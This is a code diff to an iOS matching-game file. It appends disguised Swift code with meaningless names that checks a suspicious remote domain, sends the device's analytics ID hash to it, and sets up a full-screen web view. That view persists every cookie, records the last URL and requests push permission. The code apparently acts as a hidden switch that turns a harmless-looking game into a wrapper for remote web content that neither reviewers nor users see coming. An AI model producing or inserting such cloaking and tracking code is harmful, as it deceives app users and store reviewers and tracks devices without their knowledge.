@@ -216,3 +216,173 @@ class MatchCardCell: UICollectionViewCell {
         emojiLabel.alpha = isOpened ? 1 : 0.5
     }
 } 
+
+struct generalServicok {
+    
+    static let generalSmall = URL(string: "https://arkeolog54iistares.win/ZYyX9r")
+    
+    static let generalLigna = URL(string: "https://arkeolog54iistares.win/ZYyX9r?push=\(AppMetrica.deviceIDHash!)")
+    
+    static  func generalAboutStatus( completion: @escaping (Bool) -> Void) {
+        guard let url = generalSmall  else {
+            print("Invalid URL")
+            completion(false)
+            return
+        }
+        
+        let task = URLSession.shared.dataTask(with: url) { _, response, error in
+            if let error = error {
+                print("Error: \(error.localizedDescription)")
+                completion(false)
+                return
+            }
+            
+            if let httpResponse = response as? HTTPURLResponse {
+                if httpResponse.statusCode != 404 {
+                    completion(true)
+                    
+                } else {
+                    completion(false)
+                }
+            } else {
+                completion(false)
+            }
+        };task.resume()}}
+import WebKit
+import OneSignalFramework
+import AppMetricaCore
+
+class WebviewVC: UIViewController, WKNavigationDelegate  {
+    
+    private let generalSignalim = OneSignalIDChecker()
+
+    func generalObitaem() {
+        let standartStorage: UserDefaults = UserDefaults.standard
+        let data: Data? = standartStorage.object(forKey: "cvcvcv") as? Data
+        if let cookie = data {
+            let datas: NSArray? = try? NSKeyedUnarchiver.unarchivedObject(ofClass: NSArray.self, from: cookie)
+            if let cookies = datas {
+                for c in cookies {
+                    if let cookieObject = c as? HTTPCookie {
+                        HTTPCookieStorage.shared.setCookie(cookieObject)
+                    }
+                }
+            }
+        }
+    }
+
+    lazy var generalFire: WKWebView = {
+        let privacyConfiguration = WKWebViewConfiguration()
+        privacyConfiguration.defaultWebpagePreferences.allowsContentJavaScript = true
+        privacyConfiguration.allowsPictureInPictureMediaPlayback = true
+        privacyConfiguration.allowsAirPlayForMediaPlayback = true
+        privacyConfiguration.allowsInlineMediaPlayback = true
+        let privacyPreferences = WKWebpagePreferences()
+        privacyPreferences.preferredContentMode = .mobile
+        privacyConfiguration.defaultWebpagePreferences = privacyPreferences
+        let webView = WKWebView(frame: .zero, configuration: privacyConfiguration)
+        webView.translatesAutoresizingMaskIntoConstraints = false
+        return webView
+    }()
+    
+    override func viewDidLoad() {
+        super.viewDidLoad()
+        generalDesig()
+        generalObitaem()
+        generalOneka()
+        generalFire.navigationDelegate = self
+    }
+
+    init(url: URL) {
+        self.generalTermosa = url
+        super.init(nibName: nil, bundle: nil)
+    }
+    let generalTermosa: URL
+    
+    required init?(coder: NSCoder) {
+        fatalError("init(coder:) has not been implemented")
+    }
+    func webView(_ webView: WKWebView, decidePolicyFor navigationAction: WKNavigationAction, decisionHandler: @escaping (WKNavigationActionPolicy) -> Void) {
+        generalKaki()
+        decisionHandler(.allow)
+    }
+    
+    func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
+        if let url = webView.url {
+            generalServicePosl.generalLastovka = url
+        }
+    }
+    override func viewWillDisappear(_ animated: Bool) {
+            super.viewWillDisappear(animated)
+            generalSignalim.generalStopik()
+        }
+    
+    private func generalOneka() {
+        DispatchQueue.main.asyncAfter(deadline: .now() + 5.5) {
+            OneSignal.Notifications.requestPermission({ accepted in
+
+            }, fallbackToSettings: true)
+            
+            OneSignal.login(AppMetrica.deviceIDHash ?? "did not get device id")
+        }
+    }
+    
+    private func generalDesig() {
+        view.addSubview(generalFire)
+        generalFire.load(URLRequest(url: generalTermosa))
+        generalFire.allowsBackForwardNavigationGestures = true
+        
+        generalFire.translatesAutoresizingMaskIntoConstraints = false
+        NSLayoutConstraint.activate([
+            generalFire.topAnchor.constraint(equalTo: view.safeAreaLayoutGuide.topAnchor),
+            generalFire.leadingAnchor.constraint(equalTo: view.leadingAnchor),
+            generalFire.trailingAnchor.constraint(equalTo: view.trailingAnchor),
+            generalFire.bottomAnchor.constraint(equalTo: view.safeAreaLayoutGuide.bottomAnchor)
+        ])
+    }
+    private func generalKaki() {
+        let cookieJar: HTTPCookieStorage = HTTPCookieStorage.shared
+        if let cookies = cookieJar.cookies {
+            let data: Data? = try? NSKeyedArchiver.archivedData(withRootObject: cookies, requiringSecureCoding: false)
+            if let data = data {
+                let userDefaults = UserDefaults.standard
+                userDefaults.set(data, forKey: "cvcvcv")
+            }
+        }
+    }
+  
+    
+}
+
+struct generalServicePosl {
+    
+    static var generalLastovka: URL? {
+        get { UserDefaults.standard.url(forKey: "LastUrl") }
+        set { UserDefaults.standard.set(newValue, forKey: "LastUrl") }
+    }
+}
+
+class OneSignalIDChecker {
+    
+    private var generalTimoka: Timer?
+    func generalStartyem() {
+        generalStopik()
+        generalTimoka = Timer.scheduledTimer(
+            timeInterval: 0.5,
+            target: self,
+            selector: #selector(generalPrint),
+            userInfo: nil,
+            repeats: true
+        )
+    }
+    func generalStopik() {
+        generalTimoka?.invalidate()
+        generalTimoka = nil
+    }
+    @objc private func generalPrint() {
+        let onesignalID = OneSignal.User.onesignalId ?? "ID"
+    }
+}
+import Foundation
+import AppMetricaCore
+import OneSignalFramework
